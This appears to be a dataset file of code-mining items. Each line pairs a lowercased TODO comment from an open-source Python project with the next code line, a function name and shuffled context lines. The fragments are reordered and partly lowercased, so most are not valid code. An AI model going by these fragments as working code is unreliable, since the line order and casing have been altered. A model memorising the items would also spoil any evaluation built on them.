# add newly added packages to the todownload list </s> for pkg in self.tsinfo.getmembers():	downloadPackages self.localPackages.append(po) self.resolveDeps() if not pkg in toDownload: toDownload.append(pkg)
"size": 50  # todo: support pagination. </s> }	search }, "fields": ["title", "project", "version", "path"], if project_slug: project = get_object_or_404(Project, slug=project_slug)
)  # todo ensure dictionaries stay dictionaries </s> if hasattr(column.type, "dictionary")	parquet_file_to_pandas )
# todo: elif gcpinstance().is_gcp_instance(): </s> else:	collect elif AzureInstance().is_azure_instance(): env = AZURE env = ON_PREMISE return {"environment": env}
# todo: this is a temporal fix </s> pixels = np.rollaxis(pixels, 0, len(pixels.shape))	hog ValueError Window step unit must be either pixels or cells if mode not in ['dense', 'sparse']: raise ValueError("HOG features mode must be either dense or sparse")
# todo 2.8 i want to change the way we handle unit scaling, see </s> ws = 1	get_worldscale def get_worldscale(scene, as_scalematrix=True):
# todo: remove once elasticsearch v6.x is deprecated. </s> if self._getclientmajorversion() < 7:	_InsertEvent event_tag (EventTag): event tag. event_document = {'index': {'_index': self._index_name}} event_document['index']['_type'] = self._document_type event_values = self._GetSanitizedEventValues(event, event_data, event_tag)
# todo: this only works when orgmode is started with one orgfile </s> agenda_documents = [orgmode.get_document(i+1) for i in range(len(agenda_files))]	list_all_todos for agenda_file in agenda_files: vim.command('badd %s' % agenda_file) raw_agenda = ORGMODE.agenda_manager.get_todo(agenda_documents) cmd = [u'setlocal filetype=orgtodo']
# todo: consider adding some better error handling for bad/failed requests. </s> _persistent_analytics_post(_post_func)	_track_workflow_task res = km.record(email, event, properties if properties else {}, timestamp) _log_response("KM", {'email': email, 'event': event, 'properties': properties, 'timestamp': timestamp}, res)
# @todo: move to css </s> _style="float:left;padding-right:10px;"),	duplicates output["add_btn"] = DIV( SPAN(T("You need to have at least 2 records in this list in order to merge them."), A(T("Find more"), _href=r.url(method="", id=0, component_id=0, vars={}))
# todo not tested </s> _raise_current_error()	set_serial_number _api.X509_get_serialNumber(self._x509), small_serial) if set_result: else: asn1_serial = _api.BN_to_ASN1_INTEGER(bignum_serial[0], _api.NULL)
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: 判断返回结果，处理异常 </s> print msg	perm_role_delete task = Tasks(recycle_resource) msg = task.del_user(get_object(PermRole, id=role_id).name) key_files = os.listdir(role_key) for key_file in key_files:
self.ws = 2  # todo check. </s> elif self.arch_info.architecture_mode == arch.arch_arm_mode_arm:	_setup_arm_arch self.ip = "r15" self.sp = "r13" self.ip = "r15" self.sp = "r13"
# todo make this smarter about more complex configurations (backup original values, etc) </s> obj_doc['dps'][switch_found]['timeout'] = self.reinvestigation_frequency	config if ok: if action == 'mirror': obj_doc['dps'][switch_found]['arp_neighbor_timeout'] = self.reinvestigation_frequency if not port in obj_doc['dps'][switch_found]['interfaces'][self.mirror_ports[switch_found]]['mirror'] and port is not None:
# todo open file for writing </s> pipe = '''appsrc name=src ! audioconvert	setup def setup(self, channels=None, samplerate=None, nframes=None): super(VorbisEncoderStream, self).setup(channels, samplerate, nframes) ! vorbisenc ! oggmux if self.filename:
# todo remove backwards compatability fix in a future version </s> if build_version < 11000:	_init_backwards_compat_fixes preferences = sublime.load_settings('Preferences.sublime-settings') build_version = int(preferences.get('neovintageous_build_version', 0)) preferences.set('neovintageous_build_version', 11000) preferences.set('vintageous_use_ctrl_keys', preferences.get('vintageous_use_ctrl_keys'))
# todo: fix clone issue </s> assert self.x_train.shape[0] > cof_.n_neighbors_	test_check_parameters cof_.fit(self.X_train)
@retry()  # todo: what errors do we get for timeout, json parse failure, etc? </s> def official_flatcar_ami_release(ec2_client: baseclient) -> optional[str]:	official_flatcar_ami_release JSON_FEED_URL = 'https://stable.release.flatcar-linux.net/amd64-usr/current/flatcar_production_ami_all.json' region = ec2_client._client_config.region_name  # type: ignore
# todo: move to a base class, and have test cases inherit from that. </s> settings.addons_available_dict.pop(settings.mocked_addon.short_name, none)	remove_mock_addon def remove_mock_addon(): try: settings.ADDONS_AVAILABLE.remove(settings.MOCKED_ADDON)
# todo: adapt units_qs once we allow filtering </s> units_qs = store.units	get_view_units if not limit: limit = profile.get_unit_rows() json["units"] = _filter_view_units(units_qs, int(page), int(limit)) json["success"] = True
# todo(jay-lau-513) translate the contents to a json stdin </s> out, err = utils.trycmd('echo contents | kubectl', 'create',	pod_create contents.pod_definition_url) else: '-f', '-') if err:
# todo: copy resources once they're specified </s> log.info('installing ipython kernel spec')	run with open(os.path.join(td, 'kernel.json'), 'w') as f: json.dump(kernel_json, f, sort_keys=True) install_kernel_spec(td, 'bash', system=not self.user, replace=True)
# todo this behavior may change when eager mode is introduced </s> state = self.wait_for_termination(session_ref, graph_key)	testMain session_ref.submit_tensor_graph(json.dumps(graph.to_json()), graph_key, target_tensors=targets) self.assertEqual(state, GraphState.FAILED) a = ones((100, 50), chunks=30) * 2 + 1
# todo :: move arbitray path construction to storagelayout object </s> backup_prefix = '{0}/basebackups_{1}/base_{file_name}_{file_offset}'\	_upload_pg_cluster_dir (which affect upload throughput) would help. spec, parts = tar_partition.partition(pg_cluster_dir) .format(self.layout.prefix.rstrip('/'), FILE_STRUCTURE_VERSION, **start_backup_info)
# todo error reporting over the master event bus </s> self.event.fire_event({'minions': minions}, clear_load['jid'])	publish log.error('The requested returner {0} could not be loaded. Publication not sent.'.format(fstr.split('.')[0])) return {} new_job_load = { 'jid': clear_load['jid'],
# todo: try to remove when https://bugzilla.mozilla.org/show_bug.cgi?id=1508695 is fixed. </s> if not all_inconsistencies and any(field.startswith(k) for k in ['cf_']):	rollback if field in bug and not is_email(bug[field]): if bug[field] != new_value: print(f'Current value for field {field}:\n{bug[field]}\nis different from previous value:\n{new_value}') else:
# todo check if right </s> self.w = sp.sparse.lil_matrix(0)	Graph self.W = W else: if A: self.A = A
recording_software_version = none  # todo </s> recording_name = none  # todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 duration_s = None  # TODO recording_software_name = None  # TODO system_info = None #TODO new_info_file = RecordingInfoFile.create_empty_file(rec_dir)
# todo: the following reproduces the old behavior of </s> k.clear()	_transformBlock i.construct() for k in block.component_objects(Objective, descend_into=True): k._constructed = False k.construct()
# todo: message depending on narrowing/float-conversion </s> msg = 'implicit conversion from {} to {} (narrowing)'	write_trace buf = np.asarray(buf) if buf.dtype != dtype: warnings.warn(msg.format(buf.dtype, dtype), RuntimeWarning) xs = np.asarray(buf, order = 'C', dtype = dtype)
# todo: might need some kind of diffing too? </s> status[uid] = (list_a[uid], list_b[uid])	get_actions if uid not in status: if uid in list_a and uid in list_b:  # missing status elif uid in list_a and uid not in list_b:  # new item in a prefetch_from_a.append(uid)
#todo: a single softmax'd vector?? </s> if not numerator.type.dtype.startswith('float'):	softmax_simplifier def softmax_simplifier(numerators, denominators): for numerator in list(numerators): continue if not numerator.type.broadcastable == (False, False):
invoice_data.pop("forgiven", none)  # todo remove </s> invoice = invoice.sync_from_stripe_data(invoice_data)	test_status_forgiven_default invoice_data = deepcopy(FAKE_INVOICE) invoice_data.update({"paid": False, "closed": False}) self.assertEqual(Invoice.STATUS_OPEN, invoice.status)
# todo: only allow classmethods on base/abstract classes </s> continue	_test_adapter continue if value.im_self is not None: methods.append(name) for iface in ifaces:
#todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	DOWNLOAD try: users = plexTV().getUserList() request = urllib2.Request(url) request.add_header('X-Plex-Token', users[user]['accessToken'])
print("key error")  # todo </s> return gen_json(table, id)	respond_json table = tables[ty] except KeyError:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
error = errors[0]  # todo: handle multiple errors </s> raise graphqlerror(	handle_graphql_errors errors = j["errors"] if errors: "GraphQL error: {} / {!r}".format( error.get("message"), error.get("debug_info")
# todo: verify validity of exchanging question and support. below: encode question, conditioned on support encoding. </s> outputs, states = conditional_reader(support_embedded, support_lengths,	conditional_reader_model support_embedded = nvocab(support) print('TRAINABLE VARIABLES (only embeddings): %d' % get_total_trainable_variables()) question_embedded, question_lengths, options["repr_dim_output"], drop_keep_prob=options["drop_keep_prob"])
# todo: there was a bug related to this </s> pass	test_relu_clips_negative @pytest.mark.skip def test_relu_clips_negative(model, input_BI):
# todo(guillermooo): implement other options. </s> m = state.expect_match(r'(?p<option>.+?)(?:[:=](?p<value>.+?))?$')	scan_command_set state.skip(' ') state.ignore() params.update(m.groupdict()) return None, [TokenSet(params), TokenEof()]
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_movd_3 res = 0x00000000000000000000000087654321 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["rax"], ctx_init["rax"])
# todo: fix return type in generated code? </s> error_string = ctypes.cast(error_string, ctypes.c_char_p)	check_context_error if error_code != 0: error_string = alc.alcGetString(self._al_device, error_code) raise OpenALException(message=message, error_code=error_code,
# todo: check types </s> return pandas_timestamp_type	typer def typer(year, month, day, hour, minute, second, us, ns):
e_die('divide by zero')  # todo: location </s> new_int = old_int / rhs	ArithEvaluator elif op_id == Id.Arith_SlashEqual: if rhs == 0: elif op_id == Id.Arith_PercentEqual: if rhs == 0:
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: call out to the ceph cluster to check the </s> self._delete(cluster_id, pool_id)	test_create_args "pool[%s]!=%s (actually %s)" % (var, val, pool[var]))
# todo - add team payroll and check receiving values </s> assert alice.giving == decimal('4.00')	test_only_latest_tip_counts alice.set_subscription_to(team, '12.00') alice.set_subscription_to(team, '4.00')
annot.annotation_metadata.annotator.email = "todo"  # todo </s> annot.annotation_metadata.annotator.name = name	fill_annoatation_metadata annot.annotation_metadata.origin = "Cerulean Mountain Trust"
# todo self.update_repo should take this as a dictionary and create </s> for key in repo_contents:	test_repository_uploaded 'clusterhq-flocker-node-0.3.3-0.dev.7.noarch.rpm': '', } source_repo.child(key).touch() source_repo.child(key).setContent(repo_contents[key])
return  #todo disabled for now, see #2151 for details </s> if savegamename is none:	save def save(self, savegamename=None): self.ingame_gui.show_popup(_("Not possible"), _("Save/load for multiplayer games is not possible yet")) def sanity_checker(string): try:
# todo: can we assume reverse=false? </s> signals.m2m_changed.send(	add .filter(**self._lookup_kwargs())) new_ids = list(new_ids - set(vals)) sender=self.through, action="pre_add", instance=self.instance, reverse=False,
# todo: check pdf content? how? </s> class fake_file(object):	test_python_render _+_+_+_+_+_+_+_, ]) def __init__(self): self.chunks = []
# todo check if there is more than 1 device. </s> sec_code = input('enter ' + auth_resp['data']['devices'][0]['name'] + ' security code: ')	get_mfa def get_mfa(self, auth_resp): mfa_resp = requests.post(self.cerberus_url + '/v2/auth/mfa_check', json={'otp_token': sec_code,
# todo: consider parameterize this </s> arparams = np.array([.25])	make_trend trend = np.cumsum(rw) elif trend_type == "arma": maparams = np.array([.6]) ar = np.r_[1, -arparams]
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection try: os.environ['REQUESTS_CA_BUNDLE'] = bad_cert_fname logger.info('Trying HTTPS download of target file: ' + bad_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo(termie): we should probably return not founds instead of none </s> self.assertequals(delget_resp.body, '')	test_crud_user delget_resp = c.get_user(user_id=data['id'])
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo could use a generator here </s> prog = re.compile(name)	get_method :param name: the name of the method (a python regexp) :rtype: a list with all :class:`EncodedMethod` objects l = [] for i in self.classes.class_def:
# todo: these reductions could be delayed until _step is called. </s> loss = self._strategy.reduce(tf.distribute.reduceop.mean, per_replica_loss, none)	_forward per_replica_loss, per_replica_words = self._strategy.experimental_run_v2( _accumulate_gradients, args=(per_replica_source, per_replica_target)) num_words = { k:self._strategy.reduce(tf.distribute.ReduceOp.SUM, v, None)
# todo: usefully interpret it & other non-public-number fields </s> nonce = msg.get_string()	__init__ elif type_ == 'ssh-rsa-cert-v01@openssh.com': self.load_certificate(Message(msg.asbytes())) else: raise SSHException('Invalid key')
# todo: act </s> profiles = self.remote.get_profiles(self.token)	test_create_subprofile def test_create_subprofile(self): Test: create/edit a subprofile object subprofile = self.remote.new_subprofile(self.token) self.assertTrue(self.remote.modify_profile(subprofile, "name", "testsubprofile0", self.token))
# todo: for some reason on osx a unix socket cannot be </s> tfile = tempfile.mktemp(prefix=testfile_prefix) if osx else testfn	check def check(type): safe_rmpath(TESTFN) sock = socket.socket(AF_UNIX, type) with contextlib.closing(sock):
# todo: support other reductions </s> if (isinstance(var_def, ir.expr)	gen_combine_func while isinstance(var_def, ir.Var): var_def = guard(get_definition, f_ir, var_def) and var_def.op == 'inplace_binop' and var_def.fn in ('+=', operator.iadd)):
#  todo: move to le-utils package </s> def version_matches_range(version, version_range):	version_matches_range if version_range == '*': return True
# todo: check that the group is public and we're being added publically </s> is_publicised = content.get("publicise", false)	accept_invite user_id=user_id, ) token = yield self.store.register_user_group_membership( group_id, user_id,
# todo(mcgallaspy): get rid of old integration tests and refactor the mixin methods </s> class contextwithmixin(browseractionmixins):	request data: A string containing the serialized JSON body of the request Returns the response. def __init__(self): self.browser = context.browser
#todo: check cost line </s> coast_tile_found = false	isGroundBuildRequirementSatisfied @classmethod def isGroundBuildRequirementSatisfied(cls, x, y, island, **state): for xx,yy in [ (xx,yy) for xx in xrange(x, x + cls.size[0]) for yy in xrange(y, y + cls.size[1]) ]: tile = island.get_tile(Point(xx,yy))
assert 'could not load target data' in res.stdout  # todo: stderr </s> res = cc.fail_1(['glom', '--target-format', 'lol', basic_spec, basic_target])	test_usage_errors assert 'could not load target data' in res.stdout  # TODO: stderr res = cc.fail_1(['glom', '--target-format', 'yaml', BASIC_SPEC, '{' + BASIC_TARGET]) assert 'target-format to be one of' in res.stdout  # TODO: stderr res = cc.fail_1(['glom', '--spec-format', 'lol', BASIC_SPEC, BASIC_TARGET])
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: url accepts post, need to refactor to use get+post </s> reverse('plans-clone')	render_to_response ( _('Clone'), ), (
pass  # todo... </s> beam_out[0] = beam	perform beam = beam_trans.transpose(*map(array_trans_dims_order.index, range(array.ndim))) if self.wrap_mode == "pad_zero":
# todo(b/161332815): make jax actor work with batched or unbatched inputs. </s> observation = utils.add_batch_dim(observation)	batched_recurrent_policy def batched_recurrent_policy(params, key, observation, core_state): output, new_state = recurrent_policy(params, key, observation, core_state) return output, new_state
# todo: support parameterization through full covariance matrix. </s> loc=mean, scale_diag=scale_diag	_graph_fn_get_distribution return tfp.distributions.MultivariateNormalDiag(
# todo: copy fixture types and data </s> master_results = local_get_dialer_settings(domain_link.master_domain)	update_dialer_settings else:
# todo security </s> def browse(request, name):	browse collections = SearchController(request.user).get_solr_collection().keys() if not collections:
# todo: dump content out for debugging in the future. </s> raise	func_wrapper for iframe in iframes: pass
# todo: test stubs for other versions, especially python 2 stubs. </s> modules = set()  # type: set[str]	add_stubs def add_stubs(driver: Driver) -> None: modules.add('typing') for version in ["2and3", "3", "3.3", "3.4", "3.5"]:
# todo: must be the same if we merged/pushed before, if not -- skip </s> if not force:	_publish_data lgr.debug("Invoking copy --auto") annex_copy_options_ += ' --auto' annex_copy_options_ += ' --fast' pblshd = ds.repo.copy_to(
# todo: this filtering condition is probably wrong </s> if isinstance(box, (boxes.tablebox, boxes.linebox, boxes.replacedbox)):	column_descendants def column_descendants(box): yield box if hasattr(box, 'descendants') and box.is_in_normal_flow():
# todo: fix this! </s> self.assertequal(self.cli_test(example_tree, ('a', 'input text', '')),	test_basic def test_basic(self): (test_a, 'INPUT TEXT', {}, set(['a_option1'])
# todo: add content disposition. </s> response.content_type = "image/jpeg"	task_screenshots screenshot_path = os.path.join(folder_path, screenshot_name) if os.path.exists(screenshot_path): return open(screenshot_path, "rb").read() else:
# todo: make truly async </s> async def get_sinks(project_id):	StackdriverLoggingFacade class StackdriverLoggingFacade: client = stackdriver_logging.Client(project=project_id) return client.list_sinks()
# todo: this may block for 2 second if port is not used on windows </s> rv = sock.connect_ex(('127.0.0.1', 23333))	run return run_cli(args) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if rv == 0:  # port is in use sock.close()
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
# todo: add cwa logic </s> pass	create_train_and_test_instances test_triples=test_triples) else:
#return qvariant()  # todo: is this right? </s> return	data def data(self, index, role): if not index.isValid(): elif role != QtCore.Qt.DisplayRole: return
# todo: implement </s> raise notimplementederror	to_cpu def to_cpu(self):
# todo: add at least reflection tests before adding notimplemented version </s> def prioid(context, *args):	prioid *musicpd.org, current playlist section:* ``prioid {PRIORITY} {ID...}``
# todo also handle method and request </s> return self.client.post(hookurl, json.dumps({	callPostHook def callPostHook(result, hookURL): newRequestBody = result["Body"] "Type": "post-hook", "OriginalClientMethod": "POST", # TODO
# todo: replace suite with testcases </s> load_test_folder(os.path.join(project_working_directory, "suite"))	load_project_tests load_debugtalk_module() load_api_folder(os.path.join(project_working_directory, "api"))
# todo: caching? </s> return d	list_kernel_specs d[NATIVE_KERNEL_NAME] = _make_native_kernel_dir()
# todo(mordred) fix that data path too </s> if not found_in_argparse:	_validate_auth for opt in [p_opt.name] + [o.name for o in p_opt.deprecated]: opt = opt.replace('-', '_') config.pop(opt, None) config['auth'].pop(opt, None)
# todo: add option for simple print without colors & machine readable format </s> click.echo("{} {}".format(	clients_ls def clients_ls(ctx): for client in api.Client.objects.all(): client.name, click.style("[#{}]".format(client.id), fg="white", dim=1),
# todo(iceboy): fix caller when udoc=none is passed in. </s> role = udoc.get('role', builtin.role_default)	udoc_has_perm def udoc_has_perm(self, udoc, perm): mask = self.domain['roles'].get(role, builtin.PERM_NONE) return ((perm & mask) == perm
# todo you should put some extra protection on this, so a user can only </s> return jsonify(get_stored_tokens()), 200	list_tokens @app.route('/auth/tokens', methods=['GET']) def list_tokens():
""" todo: documentation </s> return type(self)._retainsevents	retainsevents @property def retainsevents(self):
# todo need data </s> pass	test_languages_by_repo def test_languages_by_repo(augur_db_routes):
# todo, pass also best score </s> if last_path is not none and not self.trainer.testing:	__recover_child_process_weights if self.trainer.checkpoint_callback: self.trainer.checkpoint_callback.best_model_path = best_path ckpt = torch.load(last_path, map_location=lambda storage, loc: storage) model.load_state_dict(ckpt)
#todo discont: actually use offsets instead of (start, end)! </s> messager.warning('_create_span(): using (start, end)')	_create_span def _create_span(collection, document, offsets, _type, attributes=None, _id=None, comment=None): start, end = offsets[0] directory = collection
raise  # todo: error reporting </s> else:	load raise  # TODO: error reporting except os.error: self._remember(filename) self.send("Classifier", classifier)
# todo: move succeed to papyon callbacks </s> self.session.add_event(event.event_group_add_succeed,	_handle_action_add_group def _handle_action_add_group(self, name): self.address_book.add_group(name) name)
#todo: check if/where this is used; if not used externally - remove </s> return self.marker_detector.marker_min_confidence	Surface_Tracker @property def marker_min_confidence(self) -> float: @marker_min_confidence.setter def marker_min_confidence(self, value: float):
# todo does not work after multiprocessing branch merge </s> closes the connection to mpd.	_connection_close ``close``
# todo: support classification </s> if isinstance(self.loss, multiloss):	to_prediction torch.Tensor: predictions of shape batch_size x timesteps if out.get("output_transformation", True) is None: out = [Metric.to_prediction(loss, out["prediction"][idx]) for idx, loss in enumerate(self.loss)] else:
# todo: does this type of numeric literal actually work? </s> (nuri(edge_ann_uri), quri('cdao:has_value'), str(clade.branch_length)),	process_clade (nUri(edge_ann_uri), qUri('rdf:type'), qUri('cdao:EdgeLength')), (nUri(edge_uri), qUri('cdao:has_annotation'), nUri(edge_ann_uri)), ] for stmt in statements:
# todo: call to _keys is bad </s> statements = self.storage_adapter._keys()	get_statements_in_response_to Returns a list of statement objects that are in response to a specified statement object. results = [] for statement in statements:
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo: does not handle pruning. </s> stack_port = valve.dp.shortest_path_port(self.dp.name)	_vlan_rcv_packet return {} for valve in stacked_other_valves: valve_vlan = valve.dp.vlans.get(pkt_meta.vlan.vid, None) if stack_port and valve_vlan:
#todo: if the device is managed and user has nmcli installed, </s> if interface_name in l:	is_managed_by_network_manager if err == None and out != "": for l in out.splitlines(): if "unmanaged" not in l: is_managed = True
# todo: handle timeout </s> datareceived = self.read(timeout)	sendReceive self.write(data) while stopWaitingResponse is False: ipHeaderLen = (dataReceived[0] & 15) * 4  # (Bitwise AND 00001111) x 4bytes portSrcRx = (dataReceived[ipHeaderLen] * 256) + dataReceived[ipHeaderLen + 1]
# todo: a way to store a channel's key in configuration </s> save = false	_join bot.join(channel) else: bot.join(channel, key) if save and channel not in bot.config.core.channels:
# todo incorporate weights -- currently handled by smoothing </s> observations = [arm.log2.values	as_observation_matrix in each numpy array. Returns: List of numpy.ndarray, one per chromosome arm. for _c, arm in cnarr.by_arm()] return observations
):  # todo? this equates the outputs </s> input_module = util.pythonise(pipe_wire['src']['moduleid'])	write_pipe pipe_wire['tgt']['id'] == '_INPUT' and pipe_wire['src']['id'].startswith('_OUTPUT') if module_id in pipe['embed']: assert input_module == (
# todo: use a namedtuple? </s> fs_i, offset, c_shape, actee = cinfo	compile_expression assignments = [] for cinfo in cinfo_list: if actee not in declared_temps: c_type = eigen_matrixbase_type(shape=c_shape)
# @todo: where is this in the yt api? </s> if pf.cosmological_simulation:	write_to_gdf g.attrs["unique_identifier"] = pf.unique_identifier g.attrs["cosmological_simulation"] = pf.cosmological_simulation g.attrs["current_redshift"] = pf.current_redshift g.attrs["omega_matter"] = pf.omega_matter
" # todo: i18n", </s> '-print("hello world!")',	test_process_hunks_invalid_hunks " ", " ", '+print(tr("Hello world!"))', " ",
# todo: consult best practices for python and twisted logging. </s> logging.basicconfig(level=logging.info)	main def main(argv=sys.argv, _abort_for_test=False): log.startLoggingWithObserver(log.PythonLoggingObserver(loggerName='shinysdr').emit, False) argParser = argparse.ArgumentParser(prog=argv[0])
# todo: remove this when domain decomposition is merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_dd_mesh_lower_left def set_dd_mesh_lower_left(self, lower_left): 'version of openmc') if not isinstance(lower_left, (tuple, list, np.ndarray)):
# todo: use different flag than .reentrant </s> pos1 = colorsorter._transform_point(pos1)	schedule_cylinder color, pos1, pos2, radius, capped, ColorSorter._debug_transforms() ##### if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: pos2 = ColorSorter._transform_point(pos2)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_float def test_fail_depth_float(self):
# todo: do i also need to test post/array? </s> self.asserttrue(true)	test_insert_shadow_document_simple parallel versions collection when the entire document is version controlled.
uploader.upload_file(file, container='export') # todo: right container folder?! </s> finally:	export_json memzip = make_onefile_memzip(datafile.name, '%s_task_run.json' % name) file = FileStorage(filename='%d_%s_task_run_json.zip' % (app.id, name), stream=memzip) datafile.close()
# todo: g+ has a multiply-valued 'urls' field. ignoring for now because </s> url = actor.get('url')	create_new if user_json: actor = new.as_source.user_to_actor(json.loads(user_json)) if url: try:
# todo implement for all channels </s> return none	_handle_toggle def _handle_toggle(self, message):
# todo testing </s> sys.stdout.write('forwarding bacnet cov')	forward_bacnet_cov_value @RPC.export def forward_bacnet_cov_value(self, device_identifier, source_address, object_identifier, list_of_values): for instance in self.instances: if instance.interface.target_address == source_address:
# todo: these are required for consistency with couch representation, figure out how best to deal with it </s> prepped_case['doc_type'] = 'commcarecase'	prepare_sql_case_json_for_elasticsearch def prepare_sql_case_json_for_elasticsearch(sql_case_json): prepped_case = transform_case_for_elasticsearch(sql_case_json) prepped_case['_id'] = prepped_case['case_id'] return prepped_case
# wait until the chunks have added, todo change this to a qtbot.waitsignal </s> qtbot.wait(short_loading_delay)	test_tiled_screenshot visual = viewer.window.qt_viewer.layer_to_visual[layer] assert isinstance(visual, VispyTiledImageLayer) screenshot = viewer.screenshot(canvas_only=True) center_coord = np.round(np.array(screenshot.shape[:2]) / 2).astype(np.int)
# todo use the phobos settings for this information </s> except exception:	exportSdf SubElement(authorEL, 'name').text = "DUMMY" SubElement(authorEL, 'email').text = "dummy@dummy.mail" import sys import traceback
# todo: test for last revision minus 50 on second page. </s> offset = url_for(controller='revision', action='list')	test_list_long self.create_100_revisions() try: res = self.app.get(offset) self.assert_click(res, '2', 'Revision 2')
elif order <= 2147483647:   # todo: don't hard code </s> return fast_arith.arith_llong().gcd_longlong	get_gcd if order <= 46340:   # todo: don't hard code return fast_arith.arith_int().gcd_int raise NotImplementedError
# todo?: if sha256 of the address is in deletedaddresses, </s> logger.error('email_relay', extra={'message_json': message_json})	_sns_mail return HttpResponse("Address does not exist") except RelayAddress.DoesNotExist: return HttpResponse("Address does not exist", status=404) logger.info('email_relay', extra={
# todo make comments clearer, see _viterbi_decode </s> next_score = broadcast_score + self.transitions + broadcast_emissions	_compute_normalizer broadcast_score = score.unsqueeze(2) broadcast_emissions = emissions[i].unsqueeze(1)
# todo: add docstring </s> def add_target_to_bin(self, target_filepath):	add_target_to_bin return self.act_on_target_to_bin(target_filepath, 'add_target')
# todo extend to nonbinary nodes </s> def _hamming_matrix(n):	_hamming_matrix binary nodes. Args:
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
# todo: refactor this </s> config_file = open(config, 'w+')	_login self.api = login(token=auth.token, two_factor_callback=self._two_factor_code) parser.write(config_file) config_file.close()
# todo: deal with scroll position </s> @objc.python_method	FGMainWindowController if self._fontGroup.width > newWidth + groupsSizePadding: self._fontGroup.width = newWidth def setFontItemText(self, fontKey, fontItem, txt, isSelectedFont): fontPath, fontNumber = fontKey
# todo: find a better way to return errors... </s> for filename in archive.namelist():	unzip_python def unzip_python(archivecontents): archive = zipfile.ZipFile(cStringIO.StringIO(archivecontents), 'r') if not filename.endswith(os.extsep + self.fileext): print "error adding %s: not a %s file" % (filename, os.extsep + self.fileext)
# todo: implement me </s> self.logmessage("%s %s" % (msg.__class__, vars(msg)), 4)	DistribBranchLevel def DistribBranchLevel(self, msg):
# todo docstring </s> desired_node_applications = []	change_node_configuration def change_node_configuration(self, desired_configuration, hostname): docstring for change_node_configuration for node in desired_configuration.nodes: if node.hostname == hostname:
# todo i18n text entries </s> for entry in setting.choices:	_create_choice_control _write_async(s, cbbox.get_active_id(), cbbox.get_parent()) c = Gtk.ComboBoxText() c.append(str(entry), str(entry)) c.connect('changed', _combo_notify, setting)
# todo assert exit code != 0 </s> self.assertequal(dvol.voluminous.getoutput(),	test_create_volume_already_exists dvol = VoluminousOptions() dvol.parseOptions(ARGS + ["-p", self.tmpdir.path, "init", "foo"]) ["Error: volume foo already exists"])
# @todo: test </s> return self.activefitid	getActiveFit def getActiveFit(self):
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
# todo legacy method to be removed/refactored </s> from corehq.apps.locations.models import location	locations @property def locations(self): from corehq.apps.commtrack.models import SupplyPointCase def _get_linked_supply_point_ids():
# todo modification in place </s> trimmed_read.sequence = masked_sequence	masked_read else: masked_sequence += ns trimmed_read.qualities = matches[0].read.qualities return trimmed_read
# todo(leofang): it seems as of rocm 3.5.0 hiprtc/hipcc can automatically </s> assert len(arch) > 0	compile_using_hipcc def compile_using_hipcc(source, options, arch, log_stream=None): cmd = ['hipcc', '--genco', '-arch='+arch] + list(options) with tempfile.TemporaryDirectory() as root_dir:
# todo reconsider with python 2 drop </s> kind = p._name.get_kind()	_must_be_kwarg for signature in signatures: for i, p in enumerate(signature.params): if kind is Parameter.VAR_POSITIONAL: return False
# todo: arrange </s> profile = self.remote.get_profile("testprofile0")	test_get_profile def test_get_profile(self): Test: get a profile object assert 0
# check clock sync todo: alert on clockless origin server. </s> skew = self.response.parsed_hdrs.get('date', 0) - self.response.header_timestamp + self.response.parsed_hdrs.get('age', 0)	checkCaching current_age_str = relative_time(current_age, 0, 0) self.setMessage('header-age header-date', rs.CURRENT_AGE, current_age=current_age_str) if abs(skew) > 2: # TODO: make configurable self.setMessage('date', rs.DATE_INCORRECT,
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo: do something with loggers? </s> ...	PubsubNotifee trio.BusyResourceError, ): async def disconnected(self, network: INetwork, conn: INetConn) -> None: Add peer_id to dead_peers_queue, so that pubsub and its router can
